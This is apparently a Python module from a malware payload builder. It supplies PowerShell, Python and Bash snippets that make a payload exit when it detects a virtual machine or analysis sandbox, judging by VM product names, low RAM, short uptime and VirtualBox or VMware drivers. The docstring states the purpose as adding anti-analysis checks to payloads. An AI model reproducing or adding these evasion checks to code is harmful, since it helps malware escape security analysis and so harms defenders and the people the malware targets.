"""
Sandbox/VM Detection Module
Adds anti-analysis checks to payloads
"""

class SandboxDetector:
    def __init__(self):
        pass

    def get_powershell_checks(self):
        """
        PowerShell sandbox/VM detection checks
        Returns: PowerShell code snippet
        """
        return """
# VM/Sandbox Detection
$vms = @('VirtualBox','VMware','Hyper-V','QEMU','Xen','Parallels')
$proc = Get-WmiObject Win32_ComputerSystem
if ($vms | Where-Object {$proc.Model -match $_}) { exit }

# Check RAM (Sandboxes usually have < 4GB)
if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }

# Check Uptime (Sandboxes reboot frequently)
$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
if ($uptime.TotalMinutes -lt 10) { exit }

# Check for common VM files
if (Test-Path 'C:\\Windows\\System32\\Drivers\\VBoxMouse.sys') { exit }
if (Test-Path 'C:\\Windows\\System32\\Drivers\\vmhgfs.sys') { exit }
"""

    def get_python_checks(self):
        """
        Python sandbox/VM detection checks
        """
        return """
import os, sys, platform, psutil, time
# VM Detection
vm_signs = ['VirtualBox','VMware','QEMU','Xen','Parallels']
if any(vm in platform.platform() for vm in vm_signs): sys.exit(0)

# RAM Check
if psutil.virtual_memory().total < 4 * 1024**3: sys.exit(0)

# Uptime Check
if time.time() - psutil.boot_time() < 600: sys.exit(0)

# VM File Checks
vm_files = ['/sys/class/dmi/id/product_name', '/sys/class/dmi/id/sys_vendor']
for f in vm_files:
    if os.path.exists(f):
        with open(f) as fh:
            if any(vm in fh.read() for vm in vm_signs): sys.exit(0)
"""

    def get_bash_checks(self):
        """
        Bash sandbox/VM detection checks
        """
        return """
#!/bin/bash
# VM/Sandbox Detection
if [ $(grep -c 'hypervisor' /proc/cpuinfo) -gt 0 ]; then exit 0; fi
if [ $(free -g | awk '/^Mem:/{print $2}') -lt 4 ]; then exit 0; fi
if [ $(awk '{print int($1/60)}' /proc/uptime) -lt 10 ]; then exit 0; fi
if lsmod | grep -iE 'vboxguest|vmware|vmmouse'; then exit 0; fi
"""
